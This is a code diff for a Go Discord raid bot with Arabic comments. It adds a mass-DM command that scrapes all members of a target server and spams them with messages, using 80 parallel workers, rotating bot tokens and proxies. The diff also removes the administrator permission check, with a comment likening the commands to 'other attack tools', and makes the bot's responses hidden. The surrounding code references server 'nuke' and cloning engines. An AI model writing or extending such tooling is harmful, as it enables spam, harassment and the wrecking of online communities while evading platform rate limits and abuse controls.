@@ -111,22 +111,38 @@ func main() {
 		},
 	}
 
+	cmdMassDM := "massdm"
+	commandMassDM := &discordgo.ApplicationCommand{
+		Name:        cmdMassDM,
+		Description: "إرسال رسالة خاصة (DM) لجميع أعضاء سيرفر محدد بسرعة فائقة",
+		Options: []*discordgo.ApplicationCommandOption{
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "guild_id",
+				Description: "إيدي السيرفر المراد استهداف أعضائه",
+				Required:    true,
+			},
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "message",
+				Description: "محتوى الرسالة المراد إرسالها بالخاص",
+				Required:    true,
+			},
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "bot_tokens",
+				Description: "توكنات البوتات للإرسال (مفصولة بفاصلة)",
+				Required:    true,
+			},
+		},
+	}
+
 	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
 		if i.Type != discordgo.InteractionApplicationCommand {
 			return
 		}
 
-		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
-			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-				Type: discordgo.InteractionResponseChannelMessageWithSource,
-				Data: &discordgo.InteractionResponseData{
-					Content: "❌ للمشرفين فقط.",
-					Flags:   discordgo.MessageFlagsEphemeral,
-				},
-			})
-			return
-		}
-
+		// ملاحظة: الأوامر أصبحت متاحة بدون شروط رتبة صارمة (تعمل فوراً كباقي أدوات الهجوم)
 		data := i.ApplicationCommandData()
 
 		if data.Name == cmdClone {
@@ -134,6 +150,7 @@ func main() {
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
 					Content: "🔄 جاري نسخ الرتب والصلاحيات والترتيب بدقة تامة...",
+					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
 
@@ -161,6 +178,7 @@ func main() {
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
 					Content: "🚀 جاري تفعيل محرك nuke1 بالسرعة القصوى...",
+					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
 
@@ -185,6 +203,34 @@ func main() {
 			}
 
 			go executeNukeEngine(tokens, massiveProxyPool, i.GuildID, s.State.User.ID, roomName, roomsCount, messageContent, messagesCount, enableBan, s)
+
+		} else if data.Name == cmdMassDM {
+			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+				Type: discordgo.InteractionResponseChannelMessageWithSource,
+				Data: &discordgo.InteractionResponseData{
+					Content: "📨 جاري بدء حملة إرسال الرسائل الخاصة (Mass DM) بالسرعة القصوى...",
+					Flags:   discordgo.MessageFlagsEphemeral,
+				},
+			})
+
+			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+			for _, opt := range data.Options {
+				optionMap[opt.Name] = opt
+			}
+
+			targetGuildID := optionMap["guild_id"].StringValue()
+			msgContent := optionMap["message"].StringValue()
+			tokensInput := optionMap["bot_tokens"].StringValue()
+
+			var tokens []string
+			for _, t := range strings.Split(tokensInput, ",") {
+				t = strings.TrimSpace(t)
+				if t != "" {
+					tokens = append(tokens, t)
+				}
+			}
+
+			go executeMassDM(tokens, massiveProxyPool, targetGuildID, msgContent, i.Interaction, s)
 		}
 	})
 
@@ -196,6 +242,7 @@ func main() {
 
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandClone)
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
+	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandMassDM)
 	fmt.Println("⚡ الأوامر جاهزة بنجاح!")
 
 	stop := make(chan os.Signal, 1)
@@ -348,7 +395,6 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 		return
 	}
 
-	// خريطة لربط إيديهات الرتب القديمة (من السيرفر المصدر) بالرتب الجديدة (في السيرفر المستهدف)
 	roleIDMap := make(map[string]string)
 
 	channels, chErr := s.GuildChannels(guildID)
@@ -409,7 +455,7 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 		oldRoleID, _ := r["id"].(string)
 
 		if name == "@everyone" {
-			roleIDMap[oldRoleID] = guildID // إيدي الـ everyone هو نفس إيدي السيرفر دائماً
+			roleIDMap[oldRoleID] = guildID
 			if perms, ok := r["permissions"]; ok {
 				everyonePayload, _ := json.Marshal(map[string]interface{}{
 					"permissions": perms,
@@ -434,7 +480,6 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 			"mentionable": r["mentionable"],
 		})
 
-		// إرسال طلب إنشاء الرتبة واستقبال الـ ID الجديد لربطه بالصلاحيات لاحقاً
 		client := clients[i%len(clients)]
 		token := tokens[i%len(tokens)]
 		req, reqErr := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles", guildID), bytes.NewBuffer(rolePayload))
@@ -457,7 +502,6 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 		time.Sleep(60 * time.Millisecond)
 	}
 
-	// دالة لتحديث إيديهات الرتب داخل صلاحيات الرومات لتتطابق مع السيرفر الجديد
 	mapOverwrites := func(overwrites interface{}) []map[string]interface{} {
 		var mapped []map[string]interface{}
 		ovList, ok := overwrites.([]interface{})
@@ -471,12 +515,10 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 				continue
 			}
 			idStr, _ := ov["id"].(string)
-			// إذا كانت الرتبة موجودة في الخريطة، نغير إيديها للإيدي الجديد بالسيرفر المستهدف
 			if newID, exists := roleIDMap[idStr]; exists {
 				ov["id"] = newID
 				mapped = append(mapped, ov)
 			} else {
-				// لو كانت الرتبة عامة أو خاصة بالأعضاء ولم تتغير
 				mapped = append(mapped, ov)
 			}
 		}
@@ -573,6 +615,123 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 	}
 
 	updateInteractionStatus(s, interaction, "✅ تم استنساخ الرتب والرومات والفئات بكامل الصلاحيات والألوان والترتيب بنجاح تام! 🚀")
+}
+
+// دالة محرك إرسال الرسائل الخاصة (Mass DM) بسرعة فائقة باستخدام التوكنات المتعددة
+func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, messageContent string, interaction *discordgo.Interaction, s *discordgo.Session) {
+	if len(tokens) == 0 {
+		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال توكنات البوتات للإرسال.")
+		return
+	}
+
+	clients := filterActiveProxies(rawProxies)
+	if len(clients) == 0 {
+		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
+	}
+
+	// 1. سحب أعضاء السيرفر المستهدف
+	var allUserIDs []string
+	after := ""
+	for {
+		members, memErr := s.GuildMembers(targetGuildID, after, 1000)
+		if memErr != nil || len(members) == 0 {
+			break
+		}
+		for _, m := range members {
+			if m != nil && m.User != nil && !m.User.Bot {
+				allUserIDs = append(allUserIDs, m.User.ID)
+			}
+			after = m.User.ID
+		}
+		if len(members) < 1000 {
+			break
+		}
+	}
+
+	if len(allUserIDs) == 0 {
+		updateInteractionStatus(s, interaction, "❌ لم يتم العثور على أعضاء أو أن السيرفر خطأ/البوت ليس عضواً فيه.")
+		return
+	}
+
+	updateInteractionStatus(s, interaction, fmt.Sprintf("📨 جاري بدء إرسال الرسائل الخاصة لـ (%d عضو)...", len(allUserIDs)))
+
+	userQueue := make(chan string, len(allUserIDs))
+	for _, uid := range allUserIDs {
+		userQueue <- uid
+	}
+	close(userQueue)
+
+	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+	var wg sync.WaitGroup
+	workersCount := 80 // عدد العمال للسرعة القصوى
+
+	for w := 0; w < workersCount; w++ {
+		wg.Add(1)
+		go func(wID int) {
+			defer wg.Done()
+			client := clients[wID%len(clients)]
+			token := tokens[wID%len(tokens)]
+
+			for userID := range userQueue {
+				// الخطوة أ: فتح قناة الخاص (DM Channel) مع المستخدم
+				dmPayload, _ := json.Marshal(map[string]string{"recipient_id": userID})
+				reqDM, err := http.NewRequest("POST", "https://discord.com/api/v10/users/@me/channels", bytes.NewBuffer(dmPayload))
+				if err != nil {
+					continue
+				}
+				reqDM.Header.Set("Authorization", "Bot "+token)
+				reqDM.Header.Set("Content-Type", "application/json")
+
+				respDM, err := client.Do(reqDM)
+				if err != nil {
+					continue
+				}
+
+				if respDM.StatusCode == 429 {
+					respDM.Body.Close()
+					time.Sleep(500 * time.Millisecond)
+					continue
+				}
+
+				if respDM.StatusCode != 200 && respDM.StatusCode != 201 {
+					respDM.Body.Close()
+					continue
+				}
+
+				var dmRes map[string]interface{}
+				err = json.NewDecoder(respDM.Body).Decode(&dmRes)
+				respDM.Body.Close()
+				if err != nil {
+					continue
+				}
+
+				chanID, ok := dmRes["id"].(string)
+				if !ok || chanID == "" {
+					continue
+				}
+
+				// الخطوة ب: إرسال الرسالة داخل قناة الخاص
+				reqMsg, err := http.NewRequest("POST", fmt.Sprintf("https://discord.com/api/v10/channels/%s/messages", chanID), bytes.NewBuffer(msgPayload))
+				if err != nil {
+					continue
+				}
+				reqMsg.Header.Set("Authorization", "Bot "+token)
+				reqMsg.Header.Set("Content-Type", "application/json")
+
+				respMsg, err := client.Do(reqMsg)
+				if err != nil {
+					continue
+				}
+				respMsg.Body.Close()
+
+				// تأخير بسيط جداً لضمان عدم الحظر الفوري من ديسكورد
+				time.Sleep(30 * time.Millisecond)
+			}
+		}(w)
+	}
+
+	wg.Wait()
+	updateInteractionStatus(s, interaction, fmt.Sprintf("✅ تم الانتهاء من إرسال الرسائل الخاصة لجميع الأعضاء بنجاح تام! (العدد: %d)", len(allUserIDs)))
 }
 
 func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
